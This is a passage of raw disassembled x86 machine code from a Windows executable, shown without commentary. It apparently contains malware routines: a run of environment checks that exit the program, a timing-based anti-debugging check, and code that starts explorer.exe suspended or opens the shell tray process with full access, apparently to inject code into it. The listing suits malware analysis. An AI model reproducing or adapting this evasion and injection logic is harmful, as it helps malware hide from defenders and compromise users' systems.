  40b0e7:	50                   	push   %eax
  40b0e8:	8d 85 fa fe ff ff    	lea    -0x106(%ebp),%eax
  40b0ee:	50                   	push   %eax
  40b0ef:	8b 43 04             	mov    0x4(%ebx),%eax
  40b0f2:	50                   	push   %eax
  40b0f3:	8b 03                	mov    (%ebx),%eax
  40b0f5:	50                   	push   %eax
  40b0f6:	e8 1d 86 ff ff       	call   0x403718
  40b0fb:	85 c0                	test   %eax,%eax
  40b0fd:	8b c6                	mov    %esi,%eax
  40b0ff:	5e                   	pop    %esi
  40b100:	5b                   	pop    %ebx
  40b101:	8b e5                	mov    %ebp,%esp
  40b103:	5d                   	pop    %ebp
  40b104:	c3                   	ret
  40b105:	8d 40 00             	lea    0x0(%eax),%eax
  40b108:	55                   	push   %ebp
  40b109:	8b ec                	mov    %esp,%ebp
  40b10b:	51                   	push   %ecx
  40b10c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40b10f:	b8 01 00 00 00       	mov    $0x1,%eax
  40b114:	59                   	pop    %ecx
  40b115:	5d                   	pop    %ebp
  40b116:	c3                   	ret
  40b117:	90                   	nop
  40b118:	53                   	push   %ebx
  40b119:	a1 d4 d1 40 00       	mov    0x40d1d4,%eax
  40b11e:	80 38 01             	cmpb   $0x1,(%eax)
  40b121:	75 10                	jne    0x40b133
  40b123:	e8 c4 a1 ff ff       	call   0x4052ec
  40b128:	3c 01                	cmp    $0x1,%al
  40b12a:	75 07                	jne    0x40b133
  40b12c:	6a 00                	push   $0x0
  40b12e:	e8 6d 84 ff ff       	call   0x4035a0
  40b133:	a1 b0 d1 40 00       	mov    0x40d1b0,%eax
  40b138:	80 38 01             	cmpb   $0x1,(%eax)
  40b13b:	75 10                	jne    0x40b14d
  40b13d:	e8 26 a0 ff ff       	call   0x405168
  40b142:	3c 01                	cmp    $0x1,%al
  40b144:	75 07                	jne    0x40b14d
  40b146:	6a 00                	push   $0x0
  40b148:	e8 53 84 ff ff       	call   0x4035a0
  40b14d:	a1 fc d1 40 00       	mov    0x40d1fc,%eax
  40b152:	80 38 01             	cmpb   $0x1,(%eax)
  40b155:	75 10                	jne    0x40b167
  40b157:	e8 c8 9f ff ff       	call   0x405124
  40b15c:	3c 01                	cmp    $0x1,%al
  40b15e:	75 07                	jne    0x40b167
  40b160:	6a 00                	push   $0x0
  40b162:	e8 39 84 ff ff       	call   0x4035a0
  40b167:	a1 ac d1 40 00       	mov    0x40d1ac,%eax
  40b16c:	80 38 01             	cmpb   $0x1,(%eax)
  40b16f:	75 10                	jne    0x40b181
  40b171:	e8 56 a0 ff ff       	call   0x4051cc
  40b176:	3c 01                	cmp    $0x1,%al
  40b178:	75 07                	jne    0x40b181
  40b17a:	6a 00                	push   $0x0
  40b17c:	e8 1f 84 ff ff       	call   0x4035a0
  40b181:	a1 f4 d1 40 00       	mov    0x40d1f4,%eax
  40b186:	80 38 01             	cmpb   $0x1,(%eax)
  40b189:	75 10                	jne    0x40b19b
  40b18b:	e8 80 a1 ff ff       	call   0x405310
  40b190:	3c 01                	cmp    $0x1,%al
  40b192:	75 07                	jne    0x40b19b
  40b194:	6a 00                	push   $0x0
  40b196:	e8 05 84 ff ff       	call   0x4035a0
  40b19b:	a1 c8 d1 40 00       	mov    0x40d1c8,%eax
  40b1a0:	80 38 01             	cmpb   $0x1,(%eax)
  40b1a3:	75 10                	jne    0x40b1b5
  40b1a5:	e8 fa a2 ff ff       	call   0x4054a4
  40b1aa:	3c 01                	cmp    $0x1,%al
  40b1ac:	75 07                	jne    0x40b1b5
  40b1ae:	6a 00                	push   $0x0
  40b1b0:	e8 eb 83 ff ff       	call   0x4035a0
  40b1b5:	a1 d0 d1 40 00       	mov    0x40d1d0,%eax
  40b1ba:	80 38 01             	cmpb   $0x1,(%eax)
  40b1bd:	75 10                	jne    0x40b1cf
  40b1bf:	e8 28 a2 ff ff       	call   0x4053ec
  40b1c4:	3c 01                	cmp    $0x1,%al
  40b1c6:	75 07                	jne    0x40b1cf
  40b1c8:	6a 00                	push   $0x0
  40b1ca:	e8 d1 83 ff ff       	call   0x4035a0
  40b1cf:	a1 c0 d1 40 00       	mov    0x40d1c0,%eax
  40b1d4:	80 38 01             	cmpb   $0x1,(%eax)
  40b1d7:	75 10                	jne    0x40b1e9
  40b1d9:	e8 56 a1 ff ff       	call   0x405334
  40b1de:	3c 01                	cmp    $0x1,%al
  40b1e0:	75 07                	jne    0x40b1e9
  40b1e2:	6a 00                	push   $0x0
  40b1e4:	e8 b7 83 ff ff       	call   0x4035a0
  40b1e9:	a1 f8 d1 40 00       	mov    0x40d1f8,%eax
  40b1ee:	80 38 01             	cmpb   $0x1,(%eax)
  40b1f1:	75 10                	jne    0x40b203
  40b1f3:	e8 64 a3 ff ff       	call   0x40555c
  40b1f8:	3c 01                	cmp    $0x1,%al
  40b1fa:	75 07                	jne    0x40b203
  40b1fc:	6a 00                	push   $0x0
  40b1fe:	e8 9d 83 ff ff       	call   0x4035a0
  40b203:	a1 bc d1 40 00       	mov    0x40d1bc,%eax
  40b208:	80 38 01             	cmpb   $0x1,(%eax)
  40b20b:	75 10                	jne    0x40b21d
  40b20d:	e8 7a a6 ff ff       	call   0x40588c
  40b212:	3c 01                	cmp    $0x1,%al
  40b214:	75 07                	jne    0x40b21d
  40b216:	6a 00                	push   $0x0
  40b218:	e8 83 83 ff ff       	call   0x4035a0
  40b21d:	a1 b4 d1 40 00       	mov    0x40d1b4,%eax
  40b222:	80 38 01             	cmpb   $0x1,(%eax)
  40b225:	75 10                	jne    0x40b237
  40b227:	e8 94 a4 ff ff       	call   0x4056c0
  40b22c:	3c 01                	cmp    $0x1,%al
  40b22e:	75 07                	jne    0x40b237
  40b230:	6a 00                	push   $0x0
  40b232:	e8 69 83 ff ff       	call   0x4035a0
  40b237:	a1 00 d2 40 00       	mov    0x40d200,%eax
  40b23c:	80 38 01             	cmpb   $0x1,(%eax)
  40b23f:	0f 85 3d 01 00 00    	jne    0x40b382
  40b245:	e8 ce 83 ff ff       	call   0x403618
  40b24a:	8b d8                	mov    %eax,%ebx
  40b24c:	b8 68 51 40 00       	mov    $0x405168,%eax
  40b251:	e8 fa a4 ff ff       	call   0x405750
  40b256:	84 c0                	test   %al,%al
  40b258:	74 07                	je     0x40b261
  40b25a:	6a 00                	push   $0x0
  40b25c:	e8 3f 83 ff ff       	call   0x4035a0
  40b261:	b8 cc 51 40 00       	mov    $0x4051cc,%eax
  40b266:	e8 e5 a4 ff ff       	call   0x405750
  40b26b:	84 c0                	test   %al,%al
  40b26d:	74 07                	je     0x40b276
  40b26f:	6a 00                	push   $0x0
  40b271:	e8 2a 83 ff ff       	call   0x4035a0
  40b276:	b8 ec 52 40 00       	mov    $0x4052ec,%eax
  40b27b:	e8 d0 a4 ff ff       	call   0x405750
  40b280:	84 c0                	test   %al,%al
  40b282:	74 07                	je     0x40b28b
  40b284:	6a 00                	push   $0x0
  40b286:	e8 15 83 ff ff       	call   0x4035a0
  40b28b:	b8 10 53 40 00       	mov    $0x405310,%eax
  40b290:	e8 bb a4 ff ff       	call   0x405750
  40b295:	84 c0                	test   %al,%al
  40b297:	74 07                	je     0x40b2a0
  40b299:	6a 00                	push   $0x0
  40b29b:	e8 00 83 ff ff       	call   0x4035a0
  40b2a0:	b8 34 53 40 00       	mov    $0x405334,%eax
  40b2a5:	e8 a6 a4 ff ff       	call   0x405750
  40b2aa:	84 c0                	test   %al,%al
  40b2ac:	74 07                	je     0x40b2b5
  40b2ae:	6a 00                	push   $0x0
  40b2b0:	e8 eb 82 ff ff       	call   0x4035a0
  40b2b5:	b8 ec 53 40 00       	mov    $0x4053ec,%eax
  40b2ba:	e8 91 a4 ff ff       	call   0x405750
  40b2bf:	84 c0                	test   %al,%al
  40b2c1:	74 07                	je     0x40b2ca
  40b2c3:	6a 00                	push   $0x0
  40b2c5:	e8 d6 82 ff ff       	call   0x4035a0
  40b2ca:	b8 a4 54 40 00       	mov    $0x4054a4,%eax
  40b2cf:	e8 7c a4 ff ff       	call   0x405750
  40b2d4:	84 c0                	test   %al,%al
  40b2d6:	74 07                	je     0x40b2df
  40b2d8:	6a 00                	push   $0x0
  40b2da:	e8 c1 82 ff ff       	call   0x4035a0
  40b2df:	b8 5c 55 40 00       	mov    $0x40555c,%eax
  40b2e4:	e8 67 a4 ff ff       	call   0x405750
  40b2e9:	84 c0                	test   %al,%al
  40b2eb:	74 07                	je     0x40b2f4
  40b2ed:	6a 00                	push   $0x0
  40b2ef:	e8 ac 82 ff ff       	call   0x4035a0
  40b2f4:	b8 dc 56 40 00       	mov    $0x4056dc,%eax
  40b2f9:	e8 52 a4 ff ff       	call   0x405750
  40b2fe:	84 c0                	test   %al,%al
  40b300:	74 07                	je     0x40b309
  40b302:	6a 00                	push   $0x0
  40b304:	e8 97 82 ff ff       	call   0x4035a0
  40b309:	b8 70 57 40 00       	mov    $0x405770,%eax
  40b30e:	e8 3d a4 ff ff       	call   0x405750
  40b313:	84 c0                	test   %al,%al
  40b315:	74 07                	je     0x40b31e
  40b317:	6a 00                	push   $0x0
  40b319:	e8 82 82 ff ff       	call   0x4035a0
  40b31e:	b8 b4 57 40 00       	mov    $0x4057b4,%eax
  40b323:	e8 28 a4 ff ff       	call   0x405750
  40b328:	84 c0                	test   %al,%al
  40b32a:	74 07                	je     0x40b333
  40b32c:	6a 00                	push   $0x0
  40b32e:	e8 6d 82 ff ff       	call   0x4035a0
  40b333:	b8 8c 58 40 00       	mov    $0x40588c,%eax
  40b338:	e8 13 a4 ff ff       	call   0x405750
  40b33d:	84 c0                	test   %al,%al
  40b33f:	74 07                	je     0x40b348
  40b341:	6a 00                	push   $0x0
  40b343:	e8 58 82 ff ff       	call   0x4035a0
  40b348:	b8 c0 56 40 00       	mov    $0x4056c0,%eax
  40b34d:	e8 fe a3 ff ff       	call   0x405750
  40b352:	84 c0                	test   %al,%al
  40b354:	74 07                	je     0x40b35d
  40b356:	6a 00                	push   $0x0
  40b358:	e8 43 82 ff ff       	call   0x4035a0
  40b35d:	b8 24 51 40 00       	mov    $0x405124,%eax
  40b362:	e8 e9 a3 ff ff       	call   0x405750
  40b367:	84 c0                	test   %al,%al
  40b369:	74 07                	je     0x40b372
  40b36b:	6a 00                	push   $0x0
  40b36d:	e8 2e 82 ff ff       	call   0x4035a0
  40b372:	e8 65 a3 ff ff       	call   0x4056dc
  40b377:	3c 01                	cmp    $0x1,%al
  40b379:	75 07                	jne    0x40b382
  40b37b:	6a 00                	push   $0x0
  40b37d:	e8 1e 82 ff ff       	call   0x4035a0
  40b382:	a1 00 d2 40 00       	mov    0x40d200,%eax
  40b387:	80 38 01             	cmpb   $0x1,(%eax)
  40b38a:	75 31                	jne    0x40b3bd
  40b38c:	e8 df a3 ff ff       	call   0x405770
  40b391:	e8 82 82 ff ff       	call   0x403618
  40b396:	33 d2                	xor    %edx,%edx
  40b398:	52                   	push   %edx
  40b399:	50                   	push   %eax
  40b39a:	8b c3                	mov    %ebx,%eax
  40b39c:	99                   	cltd
  40b39d:	29 04 24             	sub    %eax,(%esp)
  40b3a0:	19 54 24 04          	sbb    %edx,0x4(%esp)
  40b3a4:	58                   	pop    %eax
  40b3a5:	5a                   	pop    %edx
  40b3a6:	83 fa 00             	cmp    $0x0,%edx
  40b3a9:	75 09                	jne    0x40b3b4
  40b3ab:	3d 88 13 00 00       	cmp    $0x1388,%eax
  40b3b0:	76 0b                	jbe    0x40b3bd
  40b3b2:	eb 02                	jmp    0x40b3b6
  40b3b4:	7e 07                	jle    0x40b3bd
  40b3b6:	6a 00                	push   $0x0
  40b3b8:	e8 e3 81 ff ff       	call   0x4035a0
  40b3bd:	5b                   	pop    %ebx
  40b3be:	c3                   	ret
  40b3bf:	90                   	nop
  40b3c0:	55                   	push   %ebp
  40b3c1:	8b ec                	mov    %esp,%ebp
  40b3c3:	83 c4 90             	add    $0xffffff90,%esp
  40b3c6:	53                   	push   %ebx
  40b3c7:	56                   	push   %esi
  40b3c8:	33 c0                	xor    %eax,%eax
  40b3ca:	89 45 90             	mov    %eax,-0x70(%ebp)
  40b3cd:	89 45 94             	mov    %eax,-0x6c(%ebp)
  40b3d0:	89 45 98             	mov    %eax,-0x68(%ebp)
  40b3d3:	89 45 9c             	mov    %eax,-0x64(%ebp)
  40b3d6:	89 45 a0             	mov    %eax,-0x60(%ebp)
  40b3d9:	33 c0                	xor    %eax,%eax
  40b3db:	55                   	push   %ebp
  40b3dc:	68 a8 b7 40 00       	push   $0x40b7a8
  40b3e1:	64 ff 30             	push   %fs:(%eax)
  40b3e4:	64 89 20             	mov    %esp,%fs:(%eax)
  40b3e7:	a1 cc d1 40 00       	mov    0x40d1cc,%eax
  40b3ec:	e8 ab 6b ff ff       	call   0x401f9c
  40b3f1:	8b f0                	mov    %eax,%esi
  40b3f3:	a1 10 d2 40 00       	mov    0x40d210,%eax
  40b3f8:	83 38 02             	cmpl   $0x2,(%eax)
  40b3fb:	0f 85 fc 01 00 00    	jne    0x40b5fd
  40b401:	8d 55 a0             	lea    -0x60(%ebp),%edx
  40b404:	a1 1c d2 40 00       	mov    0x40d21c,%eax
  40b409:	8b 00                	mov    (%eax),%eax
  40b40b:	e8 b4 93 ff ff       	call   0x4047c4
  40b410:	8b 45 a0             	mov    -0x60(%ebp),%eax
  40b413:	ba c0 b7 40 00       	mov    $0x40b7c0,%edx
  40b418:	e8 77 6a ff ff       	call   0x401e94
  40b41d:	0f 85 dc 00 00 00    	jne    0x40b4ff
  40b423:	a1 14 d2 40 00       	mov    0x40d214,%eax
  40b428:	80 38 01             	cmpb   $0x1,(%eax)
  40b42b:	75 4b                	jne    0x40b478
  40b42d:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40b430:	ba 44 00 00 00       	mov    $0x44,%edx
  40b435:	e8 fe 82 ff ff       	call   0x403738
  40b43a:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40b43d:	ba 10 00 00 00       	mov    $0x10,%edx
  40b442:	e8 f1 82 ff ff       	call   0x403738
  40b447:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40b44a:	50                   	push   %eax
  40b44b:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40b44e:	50                   	push   %eax
  40b44f:	6a 00                	push   $0x0
  40b451:	6a 00                	push   $0x0
  40b453:	6a 04                	push   $0x4
  40b455:	6a 00                	push   $0x0
  40b457:	6a 00                	push   $0x0
  40b459:	6a 00                	push   $0x0
  40b45b:	68 d0 b7 40 00       	push   $0x40b7d0
  40b460:	6a 00                	push   $0x0
  40b462:	e8 21 81 ff ff       	call   0x403588
  40b467:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  40b46a:	8b d6                	mov    %esi,%edx
  40b46c:	8b c3                	mov    %ebx,%eax
  40b46e:	e8 81 8c ff ff       	call   0x4040f4
  40b473:	e9 1a 01 00 00       	jmp    0x40b592
  40b478:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40b47b:	50                   	push   %eax
  40b47c:	6a 00                	push   $0x0
  40b47e:	68 e0 b7 40 00       	push   $0x40b7e0
  40b483:	e8 68 82 ff ff       	call   0x4036f0
  40b488:	50                   	push   %eax
  40b489:	e8 72 82 ff ff       	call   0x403700
  40b48e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40b491:	50                   	push   %eax
  40b492:	6a 00                	push   $0x0
  40b494:	68 ff 0f 1f 00       	push   $0x1f0fff
  40b499:	e8 aa 81 ff ff       	call   0x403648
  40b49e:	8b d8                	mov    %eax,%ebx
  40b4a0:	8b d6                	mov    %esi,%edx
  40b4a2:	8b c3                	mov    %ebx,%eax
  40b4a4:	e8 4b 8c ff ff       	call   0x4040f4
  40b4a9:	84 c0                	test   %al,%al
  40b4ab:	75 4b                	jne    0x40b4f8
  40b4ad:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40b4b0:	ba 44 00 00 00       	mov    $0x44,%edx
  40b4b5:	e8 7e 82 ff ff       	call   0x403738
  40b4ba:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40b4bd:	ba 10 00 00 00       	mov    $0x10,%edx
  40b4c2:	e8 71 82 ff ff       	call   0x403738
  40b4c7:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40b4ca:	50                   	push   %eax
  40b4cb:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40b4ce:	50                   	push   %eax
  40b4cf:	6a 00                	push   $0x0
  40b4d1:	6a 00                	push   $0x0
  40b4d3:	6a 04                	push   $0x4
  40b4d5:	6a 00                	push   $0x0
  40b4d7:	6a 00                	push   $0x0
  40b4d9:	6a 00                	push   $0x0
  40b4db:	68 d0 b7 40 00       	push   $0x40b7d0
  40b4e0:	6a 00                	push   $0x0
  40b4e2:	e8 a1 80 ff ff       	call   0x403588
  40b4e7:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  40b4ea:	8b d6                	mov    %esi,%edx
  40b4ec:	8b c3                	mov    %ebx,%eax
  40b4ee:	e8 01 8c ff ff       	call   0x4040f4
  40b4f3:	e9 9a 00 00 00       	jmp    0x40b592
  40b4f8:	b0 01                	mov    $0x1,%al
  40b4fa:	e9 93 00 00 00       	jmp    0x40b592
  40b4ff:	8d 55 f8             	lea    -0x8(%ebp),%edx
  40b502:	a1 1c d2 40 00       	mov    0x40d21c,%eax
  40b507:	8b 00                	mov    (%eax),%eax
  40b509:	e8 ce af ff ff       	call   0x4064dc
  40b50e:	3c 01                	cmp    $0x1,%al
  40b510:	75 1a                	jne    0x40b52c
  40b512:	8d 55 9c             	lea    -0x64(%ebp),%edx
  40b515:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40b518:	e8 df ae ff ff       	call   0x4063fc
  40b51d:	8b 55 9c             	mov    -0x64(%ebp),%edx
  40b520:	a1 1c d2 40 00       	mov    0x40d21c,%eax
  40b525:	e8 ea 65 ff ff       	call   0x401b14
  40b52a:	eb 15                	jmp    0x40b541
  40b52c:	8d 45 98             	lea    -0x68(%ebp),%eax
  40b52f:	e8 60 ad ff ff       	call   0x406294
  40b534:	8b 55 98             	mov    -0x68(%ebp),%edx
  40b537:	a1 1c d2 40 00       	mov    0x40d21c,%eax
  40b53c:	e8 d3 65 ff ff       	call   0x401b14
  40b541:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40b544:	ba 44 00 00 00       	mov    $0x44,%edx
  40b549:	e8 ea 81 ff ff       	call   0x403738
  40b54e:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40b551:	ba 10 00 00 00       	mov    $0x10,%edx
  40b556:	e8 dd 81 ff ff       	call   0x403738
  40b55b:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40b55e:	50                   	push   %eax
  40b55f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40b562:	50                   	push   %eax
  40b563:	6a 00                	push   $0x0
  40b565:	6a 00                	push   $0x0
  40b567:	6a 04                	push   $0x4
  40b569:	6a 00                	push   $0x0
  40b56b:	6a 00                	push   $0x0
  40b56d:	6a 00                	push   $0x0
  40b56f:	68 f0 b7 40 00       	push   $0x40b7f0
  40b574:	a1 1c d2 40 00       	mov    0x40d21c,%eax
  40b579:	8b 00                	mov    (%eax),%eax
  40b57b:	e8 c8 69 ff ff       	call   0x401f48
  40b580:	50                   	push   %eax
  40b581:	e8 02 80 ff ff       	call   0x403588
  40b586:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  40b589:	8b d6                	mov    %esi,%edx
  40b58b:	8b c3                	mov    %ebx,%eax
  40b58d:	e8 62 8b ff ff       	call   0x4040f4
  40b592:	84 c0                	test   %al,%al
  40b594:	0f 85 f3 01 00 00    	jne    0x40b78d
  40b59a:	8b 15 1c d2 40 00    	mov    0x40d21c,%edx
  40b5a0:	33 c0                	xor    %eax,%eax
  40b5a2:	e8 fd 5d ff ff       	call   0x4013a4
  40b5a7:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40b5aa:	ba 44 00 00 00       	mov    $0x44,%edx
  40b5af:	e8 84 81 ff ff       	call   0x403738
  40b5b4:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40b5b7:	ba 10 00 00 00       	mov    $0x10,%edx
  40b5bc:	e8 77 81 ff ff       	call   0x403738
  40b5c1:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40b5c4:	50                   	push   %eax
  40b5c5:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40b5c8:	50                   	push   %eax
  40b5c9:	6a 00                	push   $0x0
  40b5cb:	6a 00                	push   $0x0
  40b5cd:	6a 04                	push   $0x4
  40b5cf:	6a 00                	push   $0x0
  40b5d1:	6a 00                	push   $0x0
  40b5d3:	6a 00                	push   $0x0
  40b5d5:	68 f0 b7 40 00       	push   $0x40b7f0
  40b5da:	a1 1c d2 40 00       	mov    0x40d21c,%eax
  40b5df:	8b 00                	mov    (%eax),%eax
  40b5e1:	e8 62 69 ff ff       	call   0x401f48
  40b5e6:	50                   	push   %eax
  40b5e7:	e8 9c 7f ff ff       	call   0x403588
  40b5ec:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  40b5ef:	8b d6                	mov    %esi,%edx
  40b5f1:	8b c3                	mov    %ebx,%eax
  40b5f3:	e8 fc 8a ff ff       	call   0x4040f4
  40b5f8:	e9 90 01 00 00       	jmp    0x40b78d
  40b5fd:	a1 10 d2 40 00       	mov    0x40d210,%eax
  40b602:	83 38 01             	cmpl   $0x1,(%eax)
  40b605:	0f 85 d1 00 00 00    	jne    0x40b6dc
  40b60b:	8d 45 94             	lea    -0x6c(%ebp),%eax
  40b60e:	e8 81 ac ff ff       	call   0x406294
  40b613:	8b 55 94             	mov    -0x6c(%ebp),%edx
  40b616:	a1 1c d2 40 00       	mov    0x40d21c,%eax
  40b61b:	e8 f4 64 ff ff       	call   0x401b14
  40b620:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40b623:	ba 44 00 00 00       	mov    $0x44,%edx
  40b628:	e8 0b 81 ff ff       	call   0x403738
  40b62d:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40b630:	ba 10 00 00 00       	mov    $0x10,%edx
  40b635:	e8 fe 80 ff ff       	call   0x403738
  40b63a:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40b63d:	50                   	push   %eax
  40b63e:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40b641:	50                   	push   %eax
  40b642:	6a 00                	push   $0x0
  40b644:	6a 00                	push   $0x0
  40b646:	6a 04                	push   $0x4
  40b648:	6a 00                	push   $0x0
  40b64a:	6a 00                	push   $0x0
  40b64c:	6a 00                	push   $0x0
  40b64e:	68 f0 b7 40 00       	push   $0x40b7f0
  40b653:	a1 1c d2 40 00       	mov    0x40d21c,%eax
  40b658:	8b 00                	mov    (%eax),%eax
  40b65a:	e8 e9 68 ff ff       	call   0x401f48
  40b65f:	50                   	push   %eax
  40b660:	e8 23 7f ff ff       	call   0x403588
  40b665:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  40b668:	8b d6                	mov    %esi,%edx
  40b66a:	8b c3                	mov    %ebx,%eax
  40b66c:	e8 83 8a ff ff       	call   0x4040f4
  40b671:	84 c0                	test   %al,%al
  40b673:	0f 85 14 01 00 00    	jne    0x40b78d
  40b679:	8b 15 1c d2 40 00    	mov    0x40d21c,%edx
  40b67f:	33 c0                	xor    %eax,%eax
  40b681:	e8 1e 5d ff ff       	call   0x4013a4
  40b686:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40b689:	ba 44 00 00 00       	mov    $0x44,%edx
  40b68e:	e8 a5 80 ff ff       	call   0x403738
  40b693:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40b696:	ba 10 00 00 00       	mov    $0x10,%edx
  40b69b:	e8 98 80 ff ff       	call   0x403738
  40b6a0:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40b6a3:	50                   	push   %eax
  40b6a4:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40b6a7:	50                   	push   %eax
  40b6a8:	6a 00                	push   $0x0
  40b6aa:	6a 00                	push   $0x0
  40b6ac:	6a 04                	push   $0x4
  40b6ae:	6a 00                	push   $0x0
  40b6b0:	6a 00                	push   $0x0
  40b6b2:	6a 00                	push   $0x0
  40b6b4:	68 f0 b7 40 00       	push   $0x40b7f0
  40b6b9:	a1 1c d2 40 00       	mov    0x40d21c,%eax
  40b6be:	8b 00                	mov    (%eax),%eax
  40b6c0:	e8 83 68 ff ff       	call   0x401f48
  40b6c5:	50                   	push   %eax
  40b6c6:	e8 bd 7e ff ff       	call   0x403588
  40b6cb:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  40b6ce:	8b d6                	mov    %esi,%edx
  40b6d0:	8b c3                	mov    %ebx,%eax
  40b6d2:	e8 1d 8a ff ff       	call   0x4040f4
  40b6d7:	e9 b1 00 00 00       	jmp    0x40b78d
  40b6dc:	a1 b8 d1 40 00       	mov    0x40d1b8,%eax
  40b6e1:	80 38 01             	cmpb   $0x1,(%eax)
  40b6e4:	75 49                	jne    0x40b72f
  40b6e6:	8d 55 90             	lea    -0x70(%ebp),%edx
  40b6e9:	33 c0                	xor    %eax,%eax
  40b6eb:	e8 b4 5c ff ff       	call   0x4013a4
  40b6f0:	8b 55 90             	mov    -0x70(%ebp),%edx
  40b6f3:	a1 e8 f1 40 00       	mov    0x40f1e8,%eax
  40b6f8:	e8 97 67 ff ff       	call   0x401e94
  40b6fd:	74 30                	je     0x40b72f
  40b6ff:	68 f0 b7 40 00       	push   $0x40b7f0
  40b704:	68 f0 b7 40 00       	push   $0x40b7f0
  40b709:	6a 00                	push   $0x0
  40b70b:	a1 e8 f1 40 00       	mov    0x40f1e8,%eax
  40b710:	e8 33 68 ff ff       	call   0x401f48
  40b715:	8b c8                	mov    %eax,%ecx
  40b717:	ba f4 b7 40 00       	mov    $0x40b7f4,%edx
  40b71c:	33 c0                	xor    %eax,%eax
  40b71e:	e8 b5 a3 ff ff       	call   0x405ad8
  40b723:	e8 88 f8 ff ff       	call   0x40afb0
  40b728:	6a 00                	push   $0x0
  40b72a:	e8 71 7e ff ff       	call   0x4035a0
  40b72f:	8b 15 1c d2 40 00    	mov    0x40d21c,%edx
  40b735:	33 c0                	xor    %eax,%eax
  40b737:	e8 68 5c ff ff       	call   0x4013a4
  40b73c:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40b73f:	ba 44 00 00 00       	mov    $0x44,%edx
  40b744:	e8 ef 7f ff ff       	call   0x403738
  40b749:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40b74c:	ba 10 00 00 00       	mov    $0x10,%edx
  40b751:	e8 e2 7f ff ff       	call   0x403738
  40b756:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40b759:	50                   	push   %eax
  40b75a:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40b75d:	50                   	push   %eax
  40b75e:	6a 00                	push   $0x0
  40b760:	6a 00                	push   $0x0
  40b762:	6a 04                	push   $0x4
  40b764:	6a 00                	push   $0x0
  40b766:	6a 00                	push   $0x0
  40b768:	6a 00                	push   $0x0
  40b76a:	68 f0 b7 40 00       	push   $0x40b7f0
  40b76f:	a1 1c d2 40 00       	mov    0x40d21c,%eax
  40b774:	8b 00                	mov    (%eax),%eax
  40b776:	e8 cd 67 ff ff       	call   0x401f48
  40b77b:	50                   	push   %eax
  40b77c:	e8 07 7e ff ff       	call   0x403588
  40b781:	8b 5d e8             	mov    -0x18(%ebp),%ebx
  40b784:	8b d6                	mov    %esi,%edx
  40b786:	8b c3                	mov    %ebx,%eax
  40b788:	e8 67 89 ff ff       	call   0x4040f4
  40b78d:	33 c0                	xor    %eax,%eax
  40b78f:	5a                   	pop    %edx
  40b790:	59                   	pop    %ecx
  40b791:	59                   	pop    %ecx
  40b792:	64 89 10             	mov    %edx,%fs:(%eax)
  40b795:	68 af b7 40 00       	push   $0x40b7af
  40b79a:	8d 45 90             	lea    -0x70(%ebp),%eax
  40b79d:	ba 05 00 00 00       	mov    $0x5,%edx
  40b7a2:	e8 3d 63 ff ff       	call   0x401ae4
  40b7a7:	c3                   	ret
  40b7a8:	e9 5f 60 ff ff       	jmp    0x40180c
  40b7ad:	eb eb                	jmp    0x40b79a
  40b7af:	5e                   	pop    %esi
  40b7b0:	5b                   	pop    %ebx
  40b7b1:	8b e5                	mov    %ebp,%esp
  40b7b3:	5d                   	pop    %ebp
  40b7b4:	c3                   	ret
  40b7b5:	00 00                	add    %al,(%eax)
  40b7b7:	00 ff                	add    %bh,%bh
  40b7b9:	ff                   	(bad)
  40b7ba:	ff                   	(bad)
  40b7bb:	ff 0c 00             	decl   (%eax,%eax,1)
  40b7be:	00 00                	add    %al,(%eax)
  40b7c0:	65 78 70             	gs js  0x40b833
  40b7c3:	6c                   	insb   (%dx),%es:(%edi)
  40b7c4:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7c5:	72 65                	jb     0x40b82c
  40b7c7:	72 2e                	jb     0x40b7f7
  40b7c9:	65 78 65             	gs js  0x40b831
  40b7cc:	00 00                	add    %al,(%eax)
  40b7ce:	00 00                	add    %al,(%eax)
  40b7d0:	65 78 70             	gs js  0x40b843
  40b7d3:	6c                   	insb   (%dx),%es:(%edi)
  40b7d4:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7d5:	72 65                	jb     0x40b83c
  40b7d7:	72 2e                	jb     0x40b807
  40b7d9:	65 78 65             	gs js  0x40b841
  40b7dc:	00 00                	add    %al,(%eax)
  40b7de:	00 00                	add    %al,(%eax)
  40b7e0:	73 68                	jae    0x40b84a
  40b7e2:	65 6c                	gs insb (%dx),%es:(%edi)
  40b7e4:	6c                   	insb   (%dx),%es:(%edi)
  40b7e5:	5f                   	pop    %edi
  40b7e6:	74 72                	je     0x40b85a
  40b7e8:	61                   	popa
